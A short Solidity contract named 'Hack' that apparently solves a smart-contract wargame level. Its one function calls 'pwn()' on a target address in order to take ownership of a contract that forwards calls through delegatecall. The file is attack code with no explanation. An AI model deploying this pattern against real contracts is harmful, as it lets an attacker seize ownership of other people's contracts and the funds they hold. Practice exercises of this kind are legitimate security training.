// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Hack {
  function hack(address _del) external {
    (bool success, ) = _del.call(abi.encodeWithSignature("pwn()"));
    require(success);
  }
}
